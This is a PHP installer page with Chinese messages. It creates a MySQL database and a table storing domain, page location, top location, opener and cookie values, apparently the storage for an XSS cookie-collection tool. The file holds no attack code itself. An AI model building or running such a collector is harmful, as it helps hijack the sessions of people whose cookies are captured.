<?php
require_once('config.php');
require_once('func.inc.php');
handlePwd($INSTALL_PWD);
?>
<!doctype html>
<html>
<head>
<title>建立数据库_<?php echo $WEBSITE_NAME; ?></title>
<meta charset="utf-8" />
<meta http-equiv="Content-type" content="text/html; charset=utf-8" />
<link rel="stylesheet" type="text/css" href="style/color.css" />
<link rel="stylesheet" type="text/css" href="style/main.css" />
</head>

<body>
	<div class="select">
		<h1>一键建立数据库</h1>
		<form action="install.php" method="post" class="withBorder">
			<input type="hidden" name="pwd" value="<?php echo filter(@$_POST ['pwd']);?>">
			<input type="submit" name="install" value="Install Now" />
		</form>
	</div>
	<hr />
	<div class="console">
		<p>
<?php
function createDb() {
	global $DB_HOST, $DB_PORT, $DB_NAME, $DB_TYPE,$DB_USERNAME, $DB_PASSWORD;
	$db_dsn = "$DB_TYPE:host=$DB_HOST;port=$DB_PORT;charset=UTF8;";
	try{
		$db = new PDO($db_dsn, $DB_USERNAME, $DB_PASSWORD);
	} catch (PDOException $e){
		echo 'Error connecting to database: ' . $e->getMessage(). '<br />';
		die();
	}

	echo '即将创建数据库……<br/>';
	$stmt = $db->prepare("CREATE DATABASE IF NOT EXISTS $DB_NAME DEFAULT CHARSET utf8");
	$result = $stmt->execute();
	echo '命令执行完毕。<br/>';
	$db = null;
	if ($result !== false) {
		echo '<span class="success">创建数据库成功！</span><br/>';
	} else {
		echo '<span class="fail">创建数据库失败，错误信息：';
		echo var_export($stmt->errorInfo());
		echo '</span><br/>';
	}
	return $result;
}

function createTable() {
	global $DB_HOST, $DB_PORT, $DB_NAME, $DB_TYPE, $DB_TABLE_NAME,$DB_USERNAME, $DB_PASSWORD;
	$db_dsn = "$DB_TYPE:host=$DB_HOST;port=$DB_PORT;dbname=$DB_NAME;charset=UTF8;";
	try{
		$db = new PDO($db_dsn, $DB_USERNAME, $DB_PASSWORD);
	} catch (PDOException $e){
		echo 'Error connecting to database: ' . $e->getMessage(). '<br />';
		die();
	}
	
	$stmt = $db->prepare("CREATE TABLE IF NOT EXISTS $DB_TABLE_NAME(
		id int(10) unsigned NOT NULL AUTO_INCREMENT,
		time datetime NOT NULL,
		domain nvarchar(50) NOT NULL,
		location longtext NULL,
		toplocation longtext NULL,
		cookie longtext NULL,
		opener longtext NULL,
		primary key (id)
		);");

	echo '即将创建表<br/>';

	$result = $stmt->execute();
	echo '命令执行完毕。<br/>';
	if ($result !== false) {
		echo '<span class="success">创建表成功！</span><br/>';
	} else {
		echo '<span class="fail">创建表失败，错误信息：';
		var_export($stmt->errorInfo());
		echo '</span><br/>';
	}
	$db = null;
	return $result;
}

if(isset($_POST['install'])){
	if(createDb()){
		createTable();
	}
}
 else {
	echo '等待命令。<br />';
}
?>
</p>
	<p><a href="testDb.php" target="_blank">测试数据库连接</a>&nbsp;
	<a href="index.php">返回首页</a></p>
	<p><?php echo $DEV_INFO;?></p>
	</div>
</body>
</html>